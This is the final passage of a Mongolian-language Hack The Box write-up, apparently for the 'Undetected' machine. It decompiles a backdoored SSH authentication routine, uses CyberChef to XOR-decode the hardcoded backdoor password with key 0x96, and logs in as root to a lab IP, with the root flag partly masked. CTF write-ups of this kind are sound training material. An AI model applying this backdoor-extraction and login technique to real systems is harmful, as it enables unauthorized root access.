</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> uVar3;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__stack_chk_fail</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xd6</span>;
</span></span><span style=display:flex><span>  ctxt <span style=color:#f92672>=</span> (Authctxt <span style=color:#f92672>*</span>)ssh<span style=color:#f92672>-&gt;</span>authctxt;
</span></span><span style=display:flex><span>  local_30 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
</span></span><span style=display:flex><span>  backdoor._28_2_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa9f4</span>;
</span></span><span style=display:flex><span>  ppVar1 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>pw;
</span></span><span style=display:flex><span>  iVar8 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>valid;
</span></span><span style=display:flex><span>  backdoor._24_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbcf0b5e3</span>;
</span></span><span style=display:flex><span>  backdoor._16_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xb2d6f4a0fda0b3d6</span>;
</span></span><span style=display:flex><span>  backdoor[<span style=color:#ae81ff>30</span>] <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x5b</span>;
</span></span><span style=display:flex><span>  backdoor._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0e7abd6</span>;
</span></span><span style=display:flex><span>  backdoor._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa4b3a3f3</span>;
</span></span><span style=display:flex><span>  backdoor._8_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf7bbfdc8</span>;
</span></span><span style=display:flex><span>  backdoor._12_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfdb3d6e7</span>;
</span></span><span style=display:flex><span>  pbVar4 <span style=color:#f92672>=</span> (byte <span style=color:#f92672>*</span>)backdoor;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xd6</span>;
</span></span><span style=display:flex><span>  ctxt <span style=color:#f92672>=</span> (Authctxt <span style=color:#f92672>*</span>)ssh<span style=color:#f92672>-&gt;</span>authctxt;
</span></span><span style=display:flex><span>  local_30 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
</span></span><span style=display:flex><span>  ppVar1 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>pw;
</span></span><span style=display:flex><span>  iVar8 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>valid;
</span></span><span style=display:flex><span>  backdoor[<span style=color:#ae81ff>30</span>] <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x5b</span>;
</span></span><span style=display:flex><span>  backdoor._28_2_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa9f4</span>;
</span></span><span style=display:flex><span>  backdoor._24_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbcf0b5e3</span>;
</span></span><span style=display:flex><span>  backdoor._16_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xb2d6f4a0fda0b3d6</span>;
</span></span><span style=display:flex><span>  backdoor._12_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfdb3d6e7</span>;
</span></span><span style=display:flex><span>  backdoor._8_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf7bbfdc8</span>;
</span></span><span style=display:flex><span>  backdoor._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa4b3a3f3</span>;
</span></span><span style=display:flex><span>  backdoor._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0e7abd6</span>;
</span></span><span style=display:flex><span>  pbVar4 <span style=color:#f92672>=</span> (byte <span style=color:#f92672>*</span>)backdoor;
</span></span></code></pre></div><p>clean хийгээд харвал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  backdoor[<span style=color:#ae81ff>30</span>] <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x5b</span>;
</span></span><span style=display:flex><span>  backdoor._28_2_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa9f4</span>;
</span></span><span style=display:flex><span>  backdoor._24_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbcf0b5e3</span>;
</span></span><span style=display:flex><span>  backdoor._16_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xb2d6f4a0fda0b3d6</span>;
</span></span><span style=display:flex><span>  backdoor._12_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfdb3d6e7</span>;
</span></span><span style=display:flex><span>  backdoor._8_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf7bbfdc8</span>;
</span></span><span style=display:flex><span>  backdoor._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa4b3a3f3</span>;
</span></span><span style=display:flex><span>  backdoor._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0e7abd6</span>;
</span></span></code></pre></div><p><code>-0x5b</code><figure><img loading=lazy src=/images/undetected_post_image_6.png></figure></p><p>means:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  backdoor[<span style=color:#ae81ff>30</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa5</span>;
</span></span><span style=display:flex><span>  backdoor._28_2_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa9f4</span>;
</span></span><span style=display:flex><span>  backdoor._24_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbcf0b5e3</span>;
</span></span><span style=display:flex><span>  backdoor._16_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xb2d6f4a0fda0b3d6</span>;
</span></span><span style=display:flex><span>  backdoor._12_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfdb3d6e7</span>;
</span></span><span style=display:flex><span>  backdoor._8_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf7bbfdc8</span>;
</span></span><span style=display:flex><span>  backdoor._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa4b3a3f3</span>;
</span></span><span style=display:flex><span>  backdoor._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0e7abd6</span>;
</span></span></code></pre></div><h4 id=52-cyperchef>5.2 CyperChef<a hidden class=anchor aria-hidden=true href=#52-cyperchef>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>0xa5
</span></span><span style=display:flex><span>0xa9f4
</span></span><span style=display:flex><span>0xbcf0b5e3
</span></span><span style=display:flex><span>0xb2d6f4a0fda0b3d6
</span></span><span style=display:flex><span>0xfdb3d6e7
</span></span><span style=display:flex><span>0xf7bbfdc8
</span></span><span style=display:flex><span>0xa4b3a3f3
</span></span><span style=display:flex><span>0xf0e7abd6
</span></span></code></pre></div><ul><li><a href=https://en.wikipedia.org/wiki/Endianness>https://en.wikipedia.org/wiki/Endianness</a></li><li><a href=https://en.wikipedia.org/wiki/Hexadecimal>https://en.wikipedia.org/wiki/Hexadecimal</a></li><li><a href=https://en.wikipedia.org/wiki/Blob>https://en.wikipedia.org/wiki/Blob</a></li><li><a href=https://en.wikipedia.org/wiki/Exclusive_or>https://en.wikipedia.org/wiki/Exclusive_or</a></li></ul><p>char backdoor [31]; -><figure><img loading=lazy src=/images/undetected_post_image_7.png></figure></p><p><figure><img loading=lazy src=/images/undetected_post_image_8.png></figure>result</p><pre tabindex=0><code class=language-hex data-lang=hex>d6 ab e7 f0 f3 a3 b3 a4 c8 fd bb f7 e7 d6 b3 fd d6 b3 a0 fd a0 f4 d6 b2 e3 b5 f0 bc f4 a9 a5
</code></pre><p>from HEX:
<code>blob</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>Ö«çðó£³¤Èý»÷çÖ³ýÖ³ ý ôÖ²ãµð¼ô©¥
</span></span></code></pre></div><p>XOR:<figure><img loading=lazy src=/images/undetected_post_image_9.png></figure>key 96?</p><p>while loop with XOR:
<code>0x96</code><figure><img loading=lazy src=/images/undetected_post_image_10.png></figure></p><p>all in CyperChef
<a href="https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg">https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg</a></p><pre tabindex=0><code class=language-xor data-lang=xor>@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
</code></pre><h4 id=53-ssh>5.3 SSH<a hidden class=anchor aria-hidden=true href=#53-ssh>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh root@10.10.11.146
</span></span><span style=display:flex><span>password: @<span style=color:#f92672>=</span>qfe5%2^k-aq@%k@%6k6b@$u<span style=color:#75715e>#f*b?3</span>
</span></span></code></pre></div><p>root.txt</p><pre tabindex=0><code>b49ed54**********
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://cadil.github.io/posts/2024-03-10-htb-catch-writeup/><span class=title>« Ѳмнѳх</span><br><span>HTB - Catch</span>
</a><a class=next href=https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/><span class=title>Дараах »</span><br><span>HTB - RouterSpace</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>